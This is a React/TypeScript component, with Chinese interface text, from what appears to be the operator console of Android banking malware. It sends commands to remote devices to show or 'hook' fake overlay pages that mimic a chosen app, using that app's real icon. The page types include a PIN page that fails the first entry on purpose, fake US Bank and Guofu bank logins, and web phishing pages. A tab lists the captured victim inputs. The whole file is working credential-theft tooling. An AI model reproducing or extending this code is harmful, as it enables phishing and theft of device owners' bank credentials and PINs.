import { PlusOutlined } from "@ant-design/icons";
import { Button, Form, Input, Modal, Radio, Select, Space, Tabs, Table, message } from "antd";
import { useCallback, useEffect, useMemo, useState } from "react";
import {
  createFakePageWebLink,
  fetchFakePageSubmissions,
  fetchFakePageWebLinks,
  sendCommand,
  type FakePageWebLink,
} from "../api/client";
import type { FakePageSubmission } from "../types";
import { formatDateTime } from "../utils/format";
import "../styles/device-fake-page-modal.css";
import { useI18n, t } from "../i18n";


interface DeviceFakePageModalProps {
  open: boolean;
  deviceId: string | null;
  isOnline: boolean;
  packageName: string;
  appLabel: string;
  onClose: () => void;
  onHooksChanged?: () => void;
}

/** 同级单选：web / pin / nopin / usbank / guofu */
type FakePageType = "web" | "pin" | "nopin" | "usbank" | "guofu";

const PAGE_TYPE_HINT: Record<FakePageType, string> = {
  web: "立即下发会先弹确认框再进 WebView；挂钩则打开该 App 时直接进 WebView（需 HTTPS 链接）",
  pin: "立即下发会先弹确认框再进 PIN 页；挂钩则打开该 App 时直接进 PIN 页（第 1 次假失败，第 2 次成功后正常使用）",
  nopin: "立即下发会先弹确认框，确认后进真 App；挂钩则打开该 App 时直接进真 App（无伪页）",
  usbank: "立即下发会先弹确认框再进 US Bank；挂钩则打开该 App 时直接进登录页（采完后正常使用）",
  guofu: "立即下发会先弹确认框再进国富银行；挂钩则打开该 App 时直接进登录页（采完后正常使用）",
};

const PAGE_TYPE_ARM_SUCCESS: Record<FakePageType, string> = {
  web: "已挂钩（Web）。用户打开该应用时直接进落地页，不弹确认框",
  pin: "已挂钩（PIN）。用户打开该应用时直接进 PIN 页，不弹确认框",
  nopin: "已挂钩（无 PIN）。用户打开该应用时直接进真 App",
  usbank: "已挂钩（US Bank）。用户打开该应用时直接进登录页，不弹确认框",
  guofu: "已挂钩（国富银行）。用户打开该应用时直接进登录页，不弹确认框",
};

const PAGE_TYPE_SHOW_SUCCESS: Record<FakePageType, string> = {
  web: "伪页已下发（Web）。设备上会先弹出确认框",
  pin: "伪页已下发（PIN）。设备上会先弹出确认框",
  nopin: "伪页已下发（无 PIN）。设备上会先弹出确认框",
  usbank: "伪页已下发（US Bank）。设备上会先弹出确认框",
  guofu: "伪页已下发（国富银行）。设备上会先弹出确认框",
};

interface FakePageHook {
  packageName: string;
  title: string;
  pageType: string;
  webUrl: string;
  label: string;
  armedAt: number;
}

function parseFakePageHooks(result: Record<string, unknown> | null | undefined): FakePageHook[] {
  const raw = result?.hooks;
  if (!Array.isArray(raw)) {
    return [];
  }
  return raw.flatMap((item) => {
    if (!item || typeof item !== "object") {
      return [];
    }
    const row = item as Record<string, unknown>;
    const packageName = typeof row.packageName === "string" ? row.packageName.trim() : "";
    if (!packageName) {
      return [];
    }
    return [
      {
        packageName,
        title: typeof row.title === "string" ? row.title : "",
        pageType: typeof row.pageType === "string" ? row.pageType : "",
        webUrl: typeof row.webUrl === "string" ? row.webUrl : "",
        label: typeof row.label === "string" ? row.label : "",
        armedAt: Number(row.armedAt) || 0,
      },
    ];
  });
}

function isHttpsUrl(value: string): boolean {
  return /^https:\/\/.+/i.test(value.trim());
}

function mapWebLinkError(text: string) {
  if (text === "name_required") {
    return t("请填写名称");
  }
  if (text === "url_required") {
    return t("请填写链接");
  }
  if (text === "url_must_be_https") {
    return t("链接必须是 https:// 开头");
  }
  if (text === "url_already_exists") {
    return t("该链接已存在");
  }
  return text;
}

export function DeviceFakePageModal({
  open,
  deviceId,
  isOnline,
  packageName,
  appLabel,
  onClose,
  onHooksChanged,
}: DeviceFakePageModalProps) {
  const { locale } = useI18n();
  const [title, setTitle] = useState("");
  const [content, setContent] = useState("");
  const [pageType, setPageType] = useState<FakePageType>("web");
  const [webUrl, setWebUrl] = useState("");
  const [webLinks, setWebLinks] = useState<FakePageWebLink[]>([]);
  const [webLinksLoading, setWebLinksLoading] = useState(false);
  const [addLinkOpen, setAddLinkOpen] = useState(false);
  const [newLinkName, setNewLinkName] = useState("");
  const [newLinkUrl, setNewLinkUrl] = useState("");
  const [addingLink, setAddingLink] = useState(false);
  const [iconBase64, setIconBase64] = useState("");
  const [iconLoading, setIconLoading] = useState(false);
  const [submitBusy, setSubmitBusy] = useState<"show" | "arm" | null>(null);
  const [records, setRecords] = useState<FakePageSubmission[]>([]);
  const [recordsLoading, setRecordsLoading] = useState(false);
  const [activeTab, setActiveTab] = useState("create");
  const [hooks, setHooks] = useState<FakePageHook[]>([]);
  const [hooksLoading, setHooksLoading] = useState(false);
  const [disarmBusy, setDisarmBusy] = useState<string | null>(null);

  const webLinkOptions = useMemo(
    () =>
      webLinks.map((item) => ({
        value: item.url,
        label: `${item.name}（${item.url}）`,
      })),
    [webLinks],
  );

  const loadWebLinks = useCallback(async () => {
    setWebLinksLoading(true);
    try {
      const list = await fetchFakePageWebLinks();
      setWebLinks(list);
      setWebUrl((current) => {
        if (current && list.some((item) => item.url === current)) {
          return current;
        }
        return list[0]?.url ?? "";
      });
    } catch (error) {
      setWebLinks([]);
      message.error(error instanceof Error ? error.message : t("加载 Web 链接失败"));
    } finally {
      setWebLinksLoading(false);
    }
  }, [locale]);

  const loadIcon = useCallback(async () => {
    if (!deviceId || !packageName || !isOnline) {
      setIconBase64("");
      return;
    }
    setIconLoading(true);
    try {
      const command = await sendCommand({
        deviceId,
        cmd: "get_app_icon",
        params: { packageName, size: 192 },
        waitMs: 10000,
      });
      const icon =
        typeof command.result?.icon === "string" ? command.result.icon.trim() : "";
      if (command.status !== "success" || !icon) {
        throw new Error(command.errorMessage ?? "icon_load_failed");
      }
      setIconBase64(icon);
    } catch (error) {
      setIconBase64("");
      message.warning(error instanceof Error ? error.message : t("获取图标失败"));
    } finally {
      setIconLoading(false);
    }
  }, [locale, deviceId, isOnline, packageName]);

  const loadRecords = useCallback(async () => {
    if (!deviceId || !packageName) {
      setRecords([]);
      return;
    }
    setRecordsLoading(true);
    try {
      const list = await fetchFakePageSubmissions(deviceId, packageName, 100);
      setRecords(list);
    } catch {
      setRecords([]);
    } finally {
      setRecordsLoading(false);
    }
  }, [deviceId, packageName]);

  const loadHooks = useCallback(async () => {
    if (!deviceId || !isOnline) {
      setHooks([]);
      return;
    }
    setHooksLoading(true);
    try {
      const command = await sendCommand({
        deviceId,
        cmd: "list_fake_page_hooks",
        params: {},
        waitMs: 8000,
      });
      if (command.status !== "success") {
        throw new Error(command.errorMessage ?? command.status);
      }
      setHooks(parseFakePageHooks(command.result));
    } catch {
      setHooks([]);
    } finally {
      setHooksLoading(false);
    }
  }, [deviceId, isOnline]);

  useEffect(() => {
    if (!open) {
      return;
    }
    setTitle("");
    setContent("");
    setPageType("web");
    setWebUrl("");
    setActiveTab("create");
    setAddLinkOpen(false);
    setNewLinkName("");
    setNewLinkUrl("");
    void loadIcon();
    void loadRecords();
    void loadWebLinks();
    void loadHooks();
  }, [loadIcon, loadRecords, loadWebLinks, loadHooks, open]);

  async function handleAddWebLink() {
    const name = newLinkName.trim();
    const url = newLinkUrl.trim();
    if (!name) {
      message.warning(t("请填写名称"));
      return;
    }
    if (!url) {
      message.warning(t("请填写链接"));
      return;
    }
    if (!isHttpsUrl(url)) {
      message.warning(t("链接必须是 https:// 开头"));
      return;
    }
    setAddingLink(true);
    try {
      const created = await createFakePageWebLink({ name, url });
      message.success(t("已新增 Web 链接"));
      setAddLinkOpen(false);
      setNewLinkName("");
      setNewLinkUrl("");
      await loadWebLinks();
      setWebUrl(created.url);
    } catch (error) {
      message.error(
        mapWebLinkError(error instanceof Error ? error.message : t("新增失败")),
      );
    } finally {
      setAddingLink(false);
    }
  }

  async function submitFakePage(mode: "show" | "arm") {
    if (!deviceId) {
      return;
    }
    if (!isOnline) {
      message.error(mode === "arm" ? t("设备离线，无法挂钩伪页") : t("设备离线，无法下发伪页"));
      return;
    }
    if (!title.trim() || !content.trim()) {
      message.warning(t("请填写标题和内容"));
      return;
    }
    const trimmedWebUrl = webUrl.trim();
    if (pageType === "web") {
      if (!trimmedWebUrl) {
        message.warning(webLinks.length === 0 ? t("请先新增 Web 链接") : t("请选择 Web 落地页链接"));
        return;
      }
      if (!isHttpsUrl(trimmedWebUrl)) {
        message.warning(t("Web 链接必须是 https:// 开头"));
        return;
      }
    }
    setSubmitBusy(mode);
    try {
      const command = await sendCommand({
        deviceId,
        cmd: mode === "arm" ? "arm_fake_page" : "show_fake_page",
        params: {
          packageName,
          label: appLabel,
          title: title.trim(),
          content: content.trim(),
          icon: iconBase64,
          pageType,
          ...(pageType === "web" ? { webUrl: trimmedWebUrl } : {}),
          hasPin: pageType === "nopin" || pageType === "web" ? 0 : 1,
        },
        waitMs: 15000,
      });
      if (command.status !== "success") {
        throw new Error(command.errorMessage ?? command.status);
      }
      message.success(
        t(mode === "arm" ? PAGE_TYPE_ARM_SUCCESS[pageType] : PAGE_TYPE_SHOW_SUCCESS[pageType]),
      );
      if (mode === "arm") {
        onHooksChanged?.();
      }
      onClose();
    } catch (error) {
      message.error(error instanceof Error ? error.message : mode === "arm" ? t("挂钩失败") : t("下发失败"));
    } finally {
      setSubmitBusy(null);
    }
  }

  async function handleDisarm(targetPackage: string) {
    if (!deviceId || !isOnline) {
      return;
    }
    setDisarmBusy(targetPackage);
    try {
      const command = await sendCommand({
        deviceId,
        cmd: "disarm_fake_page",
        params: { packageName: targetPackage },
        waitMs: 8000,
      });
      if (command.status !== "success") {
        throw new Error(command.errorMessage ?? command.status);
      }
      setHooks(parseFakePageHooks(command.result));
      message.success(t("已取消挂钩"));
      onHooksChanged?.();
    } catch (error) {
      message.error(error instanceof Error ? error.message : t("取消挂钩失败"));
    } finally {
      setDisarmBusy(null);
    }
  }

  const currentHook = useMemo(
    () => hooks.find((item) => item.packageName === packageName) ?? null,
    [hooks, packageName],
  );

  const iconSrc = iconBase64
    ? iconBase64.startsWith("data:")
      ? iconBase64
      : `data:image/png;base64,${iconBase64}`
    : "";

  return (
    <>
      <Modal
        title={t("伪页 - {0}", { 0: appLabel || packageName })}
        open={open}
        onCancel={onClose}
        footer={null}
        width={640}
        centered={false}
        destroyOnClose
        className="device-fake-page-modal"
      >
        <Tabs
          activeKey={activeTab}
          onChange={setActiveTab}
          items={[
            {
              key: "create",
              label: t("制作伪页"),
              children: (
                <div className="fake-page-create">
                  <div className="fake-page-icon-box">
                    {iconLoading ? (
                      <div className="fake-page-icon-placeholder">{t("图标加载中…")}</div>
                    ) : iconSrc ? (
                      <img className="fake-page-icon" src={iconSrc} alt={appLabel} />
                    ) : (
                      <div className="fake-page-icon-placeholder">{t("暂无图标")}</div>
                    )}
                    <div className="fake-page-icon-hint">
                      {t("已自动获取包名对应应用 Icon（192×192）")}
                    </div>
                    <Button
                      size="small"
                      loading={iconLoading}
                      disabled={!isOnline}
                      onClick={() => void loadIcon()}
                    >
                      {t("重新获取 Icon")}
                    </Button>
                  </div>

                  <Form layout="vertical" className="fake-page-form">
                    <Form.Item label={t("标题")} required>
                      <Input
                        placeholder={t("标题")}
                        value={title}
                        onChange={(event) => setTitle(event.target.value)}
                        maxLength={80}
                      />
                    </Form.Item>
                    <Form.Item label={t("内容")} required>
                      <Input.TextArea
                        placeholder={t("内容")}
                        value={content}
                        onChange={(event) => setContent(event.target.value)}
                        rows={4}
                        maxLength={500}
                      />
                    </Form.Item>
                    <Form.Item label={t("类型选择")} required>
                      <Radio.Group
                        value={pageType}
                        onChange={(event) => setPageType(event.target.value as FakePageType)}
                      >
                        <Radio value="web">{t("Web 落地页")}</Radio>
                        <Radio value="pin">{t("有 PIN 码")}</Radio>
                        <Radio value="nopin">{t("无 PIN 码")}</Radio>
                        <Radio value="usbank">US Bank</Radio>
                        <Radio value="guofu">{t("国富银行")}</Radio>
                      </Radio.Group>
                      <div className="fake-page-icon-hint" style={{ marginTop: 8 }}>
                        {t(PAGE_TYPE_HINT[pageType])}
                      </div>
                    </Form.Item>
                    {pageType === "web" ? (
                      <Form.Item label={t("Web 链接 (HTTPS)")} required>
                        <Space.Compact style={{ width: "100%" }}>
                          <Select
                            showSearch
                            optionFilterProp="label"
                            loading={webLinksLoading}
                            placeholder={
                              webLinks.length === 0
                                ? t("暂无链接，请点 + 新增")
                                : t("请选择 Web 链接")
                            }
                            value={webUrl || undefined}
                            options={webLinkOptions}
                            onChange={(value) => setWebUrl(value)}
                            style={{ width: "100%" }}
                            notFoundContent={t("暂无链接，请点右侧 + 新增")}
                          />
                          <Button
                            type="primary"
                            icon={<PlusOutlined />}
                            title={t("新增 Web 链接")}
                            onClick={() => {
                              setNewLinkName("");
                              setNewLinkUrl("");
                              setAddLinkOpen(true);
                            }}
                          />
                        </Space.Compact>
                      </Form.Item>
                    ) : null}
                    <Form.Item label={t("包名")}>
                      <Input value={packageName} disabled />
                    </Form.Item>
                    {currentHook ? (
                      <div className="fake-page-icon-hint">
                        {t("当前已挂钩（")}{currentHook.pageType || t("未知类型")}
                        {currentHook.title ? ` · ${currentHook.title}` : ""}
                        {t("）。「确认挂钩」会覆盖这条；「立即下发」立刻弹确认框，不影响挂钩。")}
                      </div>
                    ) : (
                      <div className="fake-page-icon-hint">
                        {t("「立即下发」马上弹出确认框再进伪页。「确认挂钩」不立刻弹，用户打开")}{" "}
                        {appLabel || t("该应用")} {t("时直接进伪页（无确认框），采完后可正常使用。")}
                      </div>
                    )}
                  </Form>

                  <div className="fake-page-actions">
                    <Button onClick={onClose}>{t("取消")}</Button>
                    <Button
                      loading={submitBusy === "show"}
                      disabled={!isOnline || submitBusy !== null}
                      onClick={() => void submitFakePage("show")}
                    >
                      {t("立即下发")}
                    </Button>
                    <Button
                      type="primary"
                      loading={submitBusy === "arm"}
                      disabled={!isOnline || submitBusy !== null}
                      onClick={() => void submitFakePage("arm")}
                    >
                      {t("确认挂钩")}
                    </Button>
                    {currentHook ? (
                      <Button
                        danger
                        loading={disarmBusy === packageName}
                        disabled={!isOnline || submitBusy !== null}
                        onClick={() => void handleDisarm(packageName)}
                      >
                        {t("取消本应用挂钩")}
                      </Button>
                    ) : null}
                  </div>
                </div>
              ),
            },
            {
              key: "hooks",
              label: t("已挂钩{0}", { 0: hooks.length > 0 ? `（${hooks.length}）` : "" }),
              children: (
                <div className="fake-page-collect">
                  <div className="fake-page-collect-toolbar">
                    <span>{t("多应用可同时挂钩，打开对应 App 时直接进伪页（无确认框）")}</span>
                    <Button
                      size="small"
                      loading={hooksLoading}
                      disabled={!isOnline}
                      onClick={() => void loadHooks()}
                    >
                      {t("刷新")}
                    </Button>
                  </div>
                  <Table
                    size="small"
                    rowKey="packageName"
                    loading={hooksLoading}
                    dataSource={hooks}
                    pagination={false}
                    locale={{ emptyText: isOnline ? t("暂无挂钩") : t("设备离线，无法读取挂钩") }}
                    columns={[
                      {
                        title: t("应用"),
                        dataIndex: "label",
                        ellipsis: true,
                        render: (value: string, record: FakePageHook) =>
                          value || record.packageName,
                      },
                      {
                        title: t("包名"),
                        dataIndex: "packageName",
                        ellipsis: true,
                      },
                      {
                        title: t("类型"),
                        dataIndex: "pageType",
                        width: 88,
                      },
                      {
                        title: t("操作"),
                        width: 88,
                        render: (_value, record: FakePageHook) => (
                          <Button
                            size="small"
                            danger
                            loading={disarmBusy === record.packageName}
                            disabled={!isOnline}
                            onClick={() => void handleDisarm(record.packageName)}
                          >
                            {t("取消")}
                          </Button>
                        ),
                      },
                    ]}
                  />
                </div>
              ),
            },
            {
              key: "collect",
              label: t("伪页收集信息"),
              children: (
                <div className="fake-page-collect">
                  <div className="fake-page-collect-toolbar">
                    <span>{t("包名：")}{packageName}</span>
                    <Button
                      size="small"
                      loading={recordsLoading}
                      onClick={() => void loadRecords()}
                    >
                      {t("刷新")}
                    </Button>
                  </div>
                  <Table
                    size="small"
                    rowKey="id"
                    loading={recordsLoading}
                    dataSource={records}
                    pagination={{ pageSize: 8, hideOnSinglePage: true }}
                    locale={{ emptyText: t("暂无伪页提交记录") }}
                    columns={[
                      {
                        title: t("序号"),
                        width: 60,
                        render: (_value, _record, index) => index + 1,
                      },
                      {
                        title: t("标题"),
                        dataIndex: "title",
                        ellipsis: true,
                      },
                      {
                        title: t("输入内容"),
                        dataIndex: "text",
                        ellipsis: true,
                      },
                      {
                        title: t("次数"),
                        dataIndex: "submitCount",
                        width: 64,
                      },
                      {
                        title: t("采集时间"),
                        dataIndex: "capturedAt",
                        width: 168,
                        render: (value: string) => formatDateTime(value),
                      },
                    ]}
                  />
                </div>
              ),
            },
          ]}
        />
      </Modal>

      <Modal
        title={t("新增伪页 Web 链接")}
        open={addLinkOpen}
        onCancel={() => {
          if (!addingLink) {
            setAddLinkOpen(false);
          }
        }}
        onOk={() => void handleAddWebLink()}
        confirmLoading={addingLink}
        okText={t("保存")}
        cancelText={t("取消")}
        destroyOnClose
        centered={false}
        zIndex={12000}
        getContainer={() => document.body}
      >
        <Form layout="vertical" style={{ marginTop: 8 }}>
          <Form.Item label={t("名称")} required>
            <Input
              placeholder={t("例如：Chase 登录页")}
              value={newLinkName}
              onChange={(event) => setNewLinkName(event.target.value)}
              maxLength={128}
            />
          </Form.Item>
          <Form.Item label={t("链接 (HTTPS)")} required>
            <Input
              placeholder="https://example.com/landing/"
              value={newLinkUrl}
              onChange={(event) => setNewLinkUrl(event.target.value)}
              maxLength={512}
            />
          </Form.Item>
        </Form>
      </Modal>
    </>
  );
}
